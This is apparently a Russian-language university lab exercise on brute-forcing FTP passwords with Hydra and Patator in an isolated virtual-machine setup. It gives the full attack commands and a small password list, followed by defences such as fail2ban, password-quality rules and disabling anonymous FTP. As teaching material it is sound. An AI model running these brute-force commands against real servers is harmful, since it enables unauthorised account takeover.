# Лабораторная работа №12 - Исследование способов перебора паролей для FTP-серверов (в учебных целях)**  

#### **Цель работы:**  
Изучить методы перебора паролей для FTP-серверов с использованием инструментов **Hydra** и **Patator** (в учебных целях). Освоить защитные меры против подобных атак.  

---

## **1. Подготовка виртуального стенда**  

### **1.1. Создание виртуальных машин**  
Используем **2 виртуальные машины**:  
- **VM1 (Атакующий)**: Kali Linux (или другая система с установленными Hydra и Patator).  
- **VM2 (Цель)**: Сервер с FTP (например, vsftpd на Debian/Ubuntu).  

### **1.2. Настройка сети**  
- Обе машины должны находиться в одной сети.  
- **VM1 (Kali Linux)**: `192.168.56.10`  
- **VM2 (FTP-сервер)**: `192.168.56.20`  

### **1.3. Установка FTP-сервера на VM2**  
```bash
sudo apt update
sudo apt install vsftpd -y
sudo systemctl start vsftpd
sudo systemctl enable vsftpd
```  

### **1.4. Создание тестовых пользователей**  
```bash
sudo useradd -m testuser1
sudo passwd testuser1  # Установите пароль "12345"
sudo useradd -m testuser2
sudo passwd testuser2  # Установите пароль "qwerty"
```  

---

## **2. Перебор паролей с помощью Hydra**  

### **2.1. Установка Hydra** (если нет в Kali Linux)  
```bash
sudo apt install hydra -y
```  

### **2.2. Создание словаря паролей**  
Создаем файл `passwords.txt`:  
```
12345
qwerty
password
admin
123456
letmein
```  

### **2.3. Запуск атаки перебора**  
```bash
hydra -l testuser1 -P passwords.txt ftp://192.168.56.20 -V
```  
**Где:**  
- `-l` – имя пользователя.  
- `-P` – путь к файлу с паролями.  
- `-V` – подробный вывод.  

**Пример успешного подбора:**  
```
[STATUS] 192.168.56.20 ftp login: testuser1 password: 12345
```  

---

## **3. Перебор паролей с помощью Patator**  

### **3.1. Установка Patator**  
```bash
sudo apt install patator -y
```  

### **3.2. Запуск атаки**  
```bash
patator ftp_login host=192.168.56.20 user=testuser2 password=FILE0 0=passwords.txt -x ignore:mesg='Login incorrect.'
```  
**Где:**  
- `host` – IP FTP-сервера.  
- `user` – имя пользователя.  
- `password=FILE0` – чтение паролей из файла.  
- `-x ignore:mesg='Login incorrect.'` – игнорировать неудачные попытки.  

**Пример успешного подбора:**  
```
Found valid credentials: testuser2:qwerty
```  

---

## **4. Защита от перебора паролей**  

### **4.1. Ограничение попыток входа (fail2ban)**  
```bash
sudo apt install fail2ban -y
sudo nano /etc/fail2ban/jail.local
```  
**Добавляем:**  
```ini
[vsftpd]
enabled = true
maxretry = 3
bantime = 600
```  

### **4.2. Использование сложных паролей**  
```bash
sudo apt install libpam-pwquality
sudo nano /etc/security/pwquality.conf
```  
**Настройки:**  
```ini
minlen = 12
dcredit = -1
ucredit = -1
ocredit = -1
lcredit = -1
```  

### **4.3. Отключение анонимного FTP**  
```bash
sudo nano /etc/vsftpd.conf
```  
**Проверяем:**  
```ini
anonymous_enable=NO
local_enable=YES
chroot_local_user=YES
```  

**Важно:** Данная работа предназначена **только для учебных целей**. Несанкционированный перебор паролей незаконен.